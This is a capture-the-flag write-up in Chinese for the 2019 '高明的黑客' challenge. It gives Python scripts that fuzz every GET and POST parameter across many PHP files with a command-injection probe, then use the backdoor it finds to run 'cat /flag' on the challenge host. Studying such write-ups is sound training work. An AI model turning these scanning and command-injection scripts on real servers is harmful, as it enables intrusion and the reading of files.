# \[强网杯 2019]高明的黑客

## \[强网杯 2019]高明的黑客

## 考点

* 爆破脚本书写
* Python正则表达式
* Python多线程

## wp

www.tar.gz下载源码，使用notepad++在src目录中查找system，还是有很多

![](<../.gitbook/assets/image (29) (1) (1) (1).png>)

只能用脚本多线程跑

```php
import os
import re
import requests
import threading

lock = threading.Lock()
path = 'src/'
files = os.listdir(path)
url = 'http://localhost:8888/intru/src/'

def send_req(file):
    f = open('src/'+file)
    ff = f.read()
    lock.acquire()
    f.close()
    lock.release()
    get_pattern = re.compile(r"\$_GET\['\w+'\]")
    get_res = re.findall(get_pattern,ff)
    get_res = list(set(get_res))
    post_pattern = re.compile(r"\$_POST\['\w+'\]")
    post_res = re.findall(post_pattern,ff)
    post_res = list(set(post_res))
    url_test = url + file + '?' + ('=echo "peri0d"&'.join(get_res)).replace("$_GET['",'').replace("']",'') + '=echo "peri0d"'
    data = {}
    for i in post_res:
        data[i[8:-2]] = 'echo "peri0d"'
    response = requests.post(url_test, data=data)
    print(response.text)
    # print(url_test)
    # print(data)
    if "peri0d" in response.text:
        print(file)
        return file
    

#send_req('xk0SzyKwfzw.php')
l = []
for i in files:
    t = threading.Thread(target=send_req, args=(i,))
    t.start()
    l.append(t)
for i in l:
    i.join()
```

得到结果xk0SzyKwfzw.php

![](<../.gitbook/assets/image (16) (1).png>)

再写一个`get_flag`函数，复制粘贴前面的代码，改一下地址和shell

```python
def get_flag(file):
    f = open('src/'+file)
    ff = f.read()
    f.close()
    
    shell = 'cat /flag'
    get_pattern = re.compile(r"\$_GET\['\w+'\]")
    get_res = re.findall(get_pattern,ff)
    get_res = list(set(get_res))
    post_pattern = re.compile(r"\$_POST\['\w+'\]")
    post_res = re.findall(post_pattern,ff)
    post_res = list(set(post_res))
    url_test = 'http://70b853eb-51ee-40c5-a69c-ab1ec94682a8.node4.buuoj.cn:81/' + file + '?' + (f'={shell}&'.join(get_res)).replace("$_GET['",'').replace("']",'') + f'={shell}'
    data = {}
    for i in post_res:
        data[i[8:-2]] = shell
    response = requests.post(url_test, data=data)
    # print(url_test)
    # print(data)
    if "flag" in response.text:
        print(response.text)
        return file
get_flag('xk0SzyKwfzw.php')
```

![](<../.gitbook/assets/image (33) (1) (1) (1) (1) (1).png>)
